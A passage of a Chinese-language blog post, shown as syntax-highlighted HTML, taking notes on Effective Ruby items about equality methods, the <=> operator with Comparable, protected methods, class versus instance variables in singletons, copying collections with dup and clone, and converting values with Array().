irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:014:<span class="token operator"><span class="token file-descriptor important">0</span>></span> <span class="token string">"a"</span>.eql?<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>
<span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span>:013:<span class="token operator"><span class="token file-descriptor important">0</span>></span> <span class="token string">"a"</span>.equal?<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>
<span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们先看唯一不同的<code>.equal?</code>,它比较的就是内存地址，也就是对象的<code>object_id</code>，如果相同则返回<code>true</code>。<br>其他三者的默认实现都是相同的，但实现语义是不同的</p>
<ul>
<li>==：默认情况下，==用于判断两个对象是否具有相等的值。它通常由类的开发者进行重写，以便根据对象的自定义逻辑进行比较。例如，字符串比较时会检查字符串的内容是否相同。</li>
<li>===：===通常用作case和when语句中的匹配运算符。它的默认行为取决于对象的类。对大多数类来说，===与==具有相同的行为。但是，一些类（如正则表达式、范围等）可能会在===中实现不同的行为。</li>
<li>.equal?：.equal?用于比较两个对象的引用。它判断两个对象是否指向内存中的同一块位置。如果两个对象是同一个对象，则返回true；否则，返回false。</li>
<li>.eql?：.eql?默认与==具有相同的行为，用于判断两个对象是否具有相等的值。然而，不同于==，.eql?还会检查两个对象的类是否相同。如果两个对象的类不同，.eql?会返回false。<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">/</span>er<span class="token operator">/</span> <span class="token operator">===</span> <span class="token string-literal"><span class="token string">"Tyler"</span></span> <span class="token comment"># Regexp#===</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">true</span>
<span class="token string-literal"><span class="token string">"Tyler"</span></span> <span class="token operator">===</span> <span class="token regex-literal"><span class="token regex">/er/</span></span>  <span class="token comment"># String#===</span>
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
在模块儿和类定义中也对<code>===</code>进行了重写，如果右操作数是左操作数的一个示例，那么其值为真<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">001</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Array</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token boolean">true</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token builtin">Array</span>
<span class="token operator">=></span> <span class="token boolean">false</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token builtin">Array</span> <span class="token operator">===</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<ol start="3">
<li><p><code>.eql?</code>默认实现与<code>==</code>一致，但更加严格，会对值和类型同时判断</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1.0</span>
<span class="token operator">=></span> <span class="token boolean">true</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token number">1.</span>eql<span class="token operator">?</span><span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">)</span>
<span class="token operator">=></span> <span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>需要注意如果重写<code>.eql?</code>就必须同时重写<code>.hash</code>方法，因为在使用Hash时，当插入key时，会判断对象<code>.hash</code>是否一致，而不同的对象可能<code>.hash</code>一样，这时候就需要判断<code>.eql?</code>是否对象是一致的，这时候如果不重写<code>.eql?</code>，就会导致即便是值相同的对象，但判断显示不一致，结果就是导致插入多个键。下面代码示例：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Color</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    <span class="token variable">@name</span> <span class="token operator">=</span> name
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

a <span class="token operator">=</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"Red"</span></span><span class="token punctuation">)</span>
b <span class="token operator">=</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"Red"</span></span><span class="token punctuation">)</span>

<span class="token punctuation">&#123;</span>a <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"like"</span></span><span class="token punctuation">,</span> b <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"love"</span></span><span class="token punctuation">&#125;</span> 
<span class="token comment"># => &#123;#@name="Red">=>"like", #@name="Red">=>"love"&#125;  这里就是两个键</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>下面是重写版本</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Color</span>
  attr_reader <span class="token symbol">:name</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    <span class="token variable">@name</span> <span class="token operator">=</span> name
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hash</span></span>
    name<span class="token punctuation">.</span>hash
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">eql</span></span><span class="token operator">?</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span>
    name<span class="token punctuation">.</span>eql<span class="token operator">?</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

a <span class="token operator">=</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"Red"</span></span><span class="token punctuation">)</span>
b <span class="token operator">=</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"Red"</span></span><span class="token punctuation">)</span>

<span class="token punctuation">&#123;</span>a <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"like"</span></span><span class="token punctuation">,</span> b <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"love"</span></span><span class="token punctuation">&#125;</span>
<span class="token comment"># => &#123;#&lt;Color:0x000002c57c98f488>=>"love"&#125;   这时候就只有一个键了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="要点回顾"><a href="#要点回顾" class="headerlink" title="要点回顾"></a>要点回顾</h4></li>
<li><p>绝不重载<code>.equal?</code>方法，它是比较两对象是否指向同一内存地址</p>
</li>
<li><p>Hash类在冲突检测时使用<code>eql?</code>来比较键对象，默认实现可能会有问题</p>
</li>
<li><p><code>==</code>判断两对象值是否相同，而数字类提供了类型转化的判断</p>
</li>
<li><p><code>case表达式</code>使用<code>===</code>来测试每个<code>when</code>语句的值</p>
<h3 id="第十三条：通过“-lt-gt-”操作符实现比较和比较模块"><a href="#第十三条：通过“-lt-gt-”操作符实现比较和比较模块" class="headerlink" title="第十三条：通过“&lt;=&gt;”操作符实现比较和比较模块"></a>第十三条：通过“&lt;=&gt;”操作符实现比较和比较模块</h3><blockquote>
<p>如果我们想让对象之间比大小，或者对对象进行排序该怎么做？</p>
</blockquote>
</li>
</ol>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">User</span>
  attr_accessor <span class="token symbol">:sort</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>sort<span class="token punctuation">)</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span>sort <span class="token operator">=</span> sort
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>map <span class="token punctuation">&#123;</span> <span class="token operator">|</span>v<span class="token operator">|</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span> v<span class="token punctuation">&#125;</span>
list <span class="token operator">=</span> list<span class="token punctuation">.</span>sort
p list      <span class="token comment"># 这里就会报错，没法比较</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们重写<code>&lt;=&gt;</code>方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">User</span>
  attr_accessor <span class="token symbol">:sort</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>sort<span class="token punctuation">)</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span>sort <span class="token operator">=</span> sort
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token operator">&lt;=></span><span class="token punctuation">(</span>other<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token keyword">nil</span> <span class="token keyword">unless</span> other<span class="token punctuation">.</span>is_a<span class="token operator">?</span> User   <span class="token comment"># 如果不是一种类型，应该直接返回nil</span>
    sort <span class="token operator">&lt;=></span> other<span class="token punctuation">.</span>sort   <span class="token comment"># 这里使用Integer实现的 &lt;=> , 大于返回1，小于返回-1，等于返回0</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>map <span class="token punctuation">&#123;</span> <span class="token operator">|</span>v<span class="token operator">|</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span> v<span class="token punctuation">&#125;</span>
list <span class="token operator">=</span> list<span class="token punctuation">.</span>sort  <span class="token comment"># 这里排序默认调用实例的&lt;=>函数</span>
p list   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>为了完整实现对象的比较功能，我们还需要写<code>&quot;&lt;&quot; &quot;&lt;=&quot; &quot;==&quot; &quot;&gt;&quot; &quot;&gt;=&quot;</code>这五个方法，但实际上当我们重写了<code>&lt;=&gt;</code>时，只需要引入<code>Comparable</code>模块即可。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">User</span>
  <span class="token keyword">include</span><span class="token punctuation">(</span>Comparable<span class="token punctuation">)</span>
  attr_accessor <span class="token symbol">:sort</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>sort<span class="token punctuation">)</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span>sort <span class="token operator">=</span> sort
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token operator">&lt;=></span><span class="token punctuation">(</span>other<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token keyword">nil</span> <span class="token keyword">unless</span> other<span class="token punctuation">.</span>is_a<span class="token operator">?</span> User
    sort <span class="token operator">&lt;=></span> other<span class="token punctuation">.</span>sort
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

p <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="第十四条：通过protected方法共享私有状态"><a href="#第十四条：通过protected方法共享私有状态" class="headerlink" title="第十四条：通过protected方法共享私有状态"></a>第十四条：通过protected方法共享私有状态</h3><p>我们知道对于对象中的实例变量，如果想访问到，则需要定义<code>accessor</code>函数，但如果定义了该函数，就暴露出了公共访问和修改的接口。我们能不能既对接口进行限制(类似private)，又能做到不那么严格，开放一部分出来。就好像蚁群，有他们自己的交流方式，这种交流方式人类无法获取，但却能在同类的蚂蚁中分享彼此的信息，通过Ruby中的<code>protected</code>访问修饰符就可以做到</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Demo</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
    <span class="token variable">@value</span> <span class="token operator">=</span> value
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">compare</span></span><span class="token punctuation">(</span>other<span class="token punctuation">)</span>
    <span class="token keyword">if</span> other<span class="token punctuation">.</span>value <span class="token operator">></span> value   <span class="token comment"># 这里执行却不会报错</span>
      puts <span class="token string-literal"><span class="token string">"对方的数值比你大"</span></span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token keyword">protected</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">value</span></span>
    <span class="token variable">@value</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
obj <span class="token operator">=</span> <span class="token class-name">Demo</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token number">1</span>
<span class="token comment"># obj.value   这里执行就会报错，没有权限</span>
other <span class="token operator">=</span> <span class="token class-name">Demo</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token number">2</span>
obj<span class="token punctuation">.</span>compare other  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样既保证原有的封装性，又可以访问同类实例的函数。这样做的目的就是在相同类之间共享私有信息。</p>
<blockquote>
<p>要点回顾</p>
</blockquote>
<ul>
<li>通过<code>protected</code>方法共享私有状态</li>
<li>只有对象与接受者是同类对象或具有相同定义该<code>protected</code>方法的超类时，才能调被显示接受者调用<code>protected</code>方法<h3 id="第十五条：优先使用实例变量而非类变量"><a href="#第十五条：优先使用实例变量而非类变量" class="headerlink" title="第十五条：优先使用实例变量而非类变量"></a>第十五条：优先使用实例变量而非类变量</h3>类变量通常的用途是(非唯一)实现单例模式，比如我们希望系统中某个类只存在一个实例，并让所有的代码都访问这唯一的实例，比如我们项目启动时解析配置信息，然后在整个系统中共享信息<br>我们先不考虑并发问题，实现一个单例模式类<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Singleton</span>
  private_class_method <span class="token symbol">:new</span><span class="token punctuation">,</span><span class="token symbol">:dup</span><span class="token punctuation">,</span><span class="token symbol">:clone</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">instance</span></span>
    <span class="token variable">@@single</span> <span class="token operator">||=</span> <span class="token keyword">new</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
上面的代码中，我们私有方法 <code>:new,:dup,:clone</code>来保证不会有新的实例，然后定义类方法，去获取这唯一的类变量(用<code>@@</code>开头)。这时候我们创建两个继承类：<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Singleton</span>
  private_class_method <span class="token symbol">:new</span><span class="token punctuation">,</span><span class="token symbol">:dup</span><span class="token punctuation">,</span><span class="token symbol">:clone</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">instance</span></span>
    <span class="token variable">@@single</span> <span class="token operator">||=</span> <span class="token keyword">new</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">Config</span> <span class="token operator">&lt;</span> Singleton
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">Database</span> <span class="token operator">&lt;</span> Singleton
<span class="token keyword">end</span>

p Config<span class="token punctuation">.</span>instance
p Database<span class="token punctuation">.</span>instance
p Config<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>equal<span class="token operator">?</span> Database<span class="token punctuation">.</span>instance  <span class="token comment"># => true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
我们发现两个继承类的单例对象竟然是同一个对象。我们来分析一下。<br>当调用<code>Config.instance</code>时，先在<code>Config</code>类中寻找方法定义，没有就去<code>Singleton</code>中寻找，找的后这时候<code>@@single</code>还没有初始化，所以调用<code>new</code>方法，需要注意，这里的<code>new</code>执行的是<code>Singleton</code>中的<code>new</code>方法。但是这里的<code>@@single</code>类变量是属于<code>Singleton</code>类的。当执行完<code>new</code>方法后，<code>@@single</code>就被缓存起来了。这时候执行<code>Database.instance</code>也去<code>Singleton.instance</code>方法中寻找。也就获取了初始化后的<code>@@single</code>。<br>那这里我们修改一下，改为在<code>Upper</code>中定义实例变量：<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Singleton</span>
  private_class_method <span class="token symbol">:new</span><span class="token punctuation">,</span><span class="token symbol">:dup</span><span class="token punctuation">,</span><span class="token symbol">:clone</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">instance</span></span>
    <span class="token variable">@single</span> <span class="token operator">||=</span> <span class="token keyword">new</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">Config</span> <span class="token operator">&lt;</span> Singleton
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">Database</span> <span class="token operator">&lt;</span> Singleton
<span class="token keyword">end</span>

p Config<span class="token punctuation">.</span>instance
p Database<span class="token punctuation">.</span>instance
p Config<span class="token punctuation">.</span>instance<span class="token punctuation">.</span>equal<span class="token operator">?</span> Database<span class="token punctuation">.</span>instance  <span class="token comment"># => false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
我们只需要把<code>@@single 改为 @single</code><br>我们来解释一下发生了什么：</li>
</ul>
<ol>
<li>当<code>Config.instance</code>时，执行到了<code>Singleton.instance</code>，这时候定义了<code>@single</code>，而实例变量是属于<code>self</code>的，这时候<code>self</code>是<code>Config</code>，所以<code>@single</code>是属于<code>Config</code>这个类对象的实例变量，而这个值，<code>Config</code>的实例也获取不到。</li>
<li>当<code>Database.instance</code>时，执行到了<code>Singleton.instance</code>，上面定义的<code>@single</code>是属于<code>Config</code>的，所以<code>Singleton</code>中的<code>@single</code>表示还没有赋值，所以执行了<code>Database.new</code>进行赋值，也就是属于<code>Database</code></li>
</ol>
<p>实际上，Ruby已经为我们提供了线程安全的单例模式，我们直接引用即可</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Config</span>
  <span class="token keyword">include</span> Singleton
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><h3 id="第十六条：在改变作为参数的集合之前复制他们"><a href="#第十六条：在改变作为参数的集合之前复制他们" class="headerlink" title="第十六条：在改变作为参数的集合之前复制他们"></a>第十六条：在改变作为参数的集合之前复制他们</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Tuner</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>presets<span class="token punctuation">)</span>
    <span class="token variable">@presets</span> <span class="token operator">=</span> presets
    clean
  <span class="token keyword">end</span>
  <span class="token keyword">private</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">clean</span></span>
    <span class="token comment"># 保留奇数</span>
    <span class="token variable">@presets</span><span class="token punctuation">.</span>delete_if <span class="token punctuation">&#123;</span><span class="token operator">|</span>f<span class="token operator">|</span> f<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>to_i<span class="token punctuation">.</span>even<span class="token operator">?</span><span class="token punctuation">&#125;</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

presets <span class="token operator">=</span> <span class="token string-literal"><span class="token string">%w(90.1 106.2 88.5)</span></span>
tuner <span class="token operator">=</span> <span class="token class-name">Tuner</span><span class="token punctuation">.</span><span class="token keyword">new</span> presets
p presets   <span class="token comment"># => ["90.1", "88.5"]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看上面的代码，我们最初有一个数组<code>presets</code>，当被一个<code>Tuner.new</code>处理后，外部的值也发生了改变。这是因为作为参数我们传递的是对象的引用，所以方法内部的修改对外部是可见的，一般我们会在方法定义时，给方法名后加<code>!</code>，表示会修改引用本身，当某些场景中，我们不希望内部的修改直接作用于外部。我们可以通过复制他们，将复制后的引用传递给方法本身。<br>那这里就需要介绍:<code>dup 和 clone</code>方法，两者有什么区别？</p>
<ol>
<li>clone 会保留原始对象的两个附加特性：<ol>
<li>保留冻结状态</li>
<li>如果接收者中存在单例方法，则clone也会复制单例类</li>
</ol>
</li>
<li>dup 就轻松的多，不会返回冻结的对象</li>
</ol>
<p>大多数情况我们使用<code>dup</code>方法。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Tuner</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>presets<span class="token punctuation">)</span>
    <span class="token variable">@presets</span> <span class="token operator">=</span> presets<span class="token punctuation">.</span>dup
    clean
  <span class="token keyword">end</span>
  <span class="token operator">...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>需要注意一个潜在的问题，<code>dup和clone</code>返回的都是浅拷贝对象，对于像<code>Array</code>一样的集合，仅仅复制了容器本身，但没有复制容器内的元素</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">001</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Polar"</span></span><span class="token punctuation">]</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Polar"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">002</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> b <span class="token operator">=</span> a<span class="token punctuation">.</span>dup <span class="token operator">&lt;&lt;</span> <span class="token string-literal"><span class="token string">"Bear"</span></span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Polar"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"Bear"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">003</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> b<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token punctuation">&#123;</span><span class="token operator">|</span>x<span class="token operator">|</span> x<span class="token punctuation">.</span>sub<span class="token operator">!</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"lar"</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"oh"</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Pooh"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"Bear"</span></span><span class="token punctuation">]</span>
irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">004</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> a
<span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"Pooh"</span></span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以当编写自己类时，可以重写<code>initialize_copy</code>方法，来控制复制的深度，如果是已有的类，有一种大多数适用的方,使用<code>Marshal</code>类直接序列化，再反序列化。但缺点就是转化的时候，和消耗的内存，一般情况并不需要使用<code>Marshal</code>去深拷贝对象，常见的还是复制容器本身即可。</p>
<blockquote>
<p>要点回顾</p>
</blockquote>
<ul>
<li>Ruby中参数是按照引用传递的，不过对于<code>Fixnum</code>是例外</li>
<li>改变集合前先复制他们</li>
<li>dup,clone方法只会浅拷贝</li>
<li>对于大部分对象，可以使用Marshal完成浅拷贝<h3 id="第十七条：使用Array方法将nil及标量对象转成数组"><a href="#第十七条：使用Array方法将nil及标量对象转成数组" class="headerlink" title="第十七条：使用Array方法将nil及标量对象转成数组"></a>第十七条：使用Array方法将nil及标量对象转成数组</h3>看下面的这个场景：<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Demo</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>array<span class="token punctuation">)</span>
    array<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>k<span class="token operator">|</span>
      p <span class="token string-literal"><span class="token string">"遍历数据: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">k</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

array <span class="token operator">=</span> <span class="token string-literal"><span class="token string">%w(1 2 3)</span></span>
<span class="token class-name">Demo</span><span class="token punctuation">.</span><span class="token keyword">new</span> array<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<code>initialize</code>方法需要的是一个数组，但由于Ruby的动态语言特性，方法的入参可能是一个数组，一个对象，甚至是一个<code>nil</code>，那这种情况我们该如何处理呢？可能我们会想到使用<code>*array</code>，自动将参数转为一个数组。但这种显示方式并不优雅，比如当传递<code>nil</code>时，接收的参数为<code>[nil]</code>,但我们更希望是<code>[]</code><br><code>Kernel</code>模块中有一个方法，就是<code>Array</code>，注意这是一个方法，它可以将对象转为数组，比如：<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">irb<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">001</span><span class="token operator">:</span><span class="token number">0</span><span class="token operator">></span> <span class="token builtin">Array</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"Tom"</span></span><span class="token punctuation">)</span>
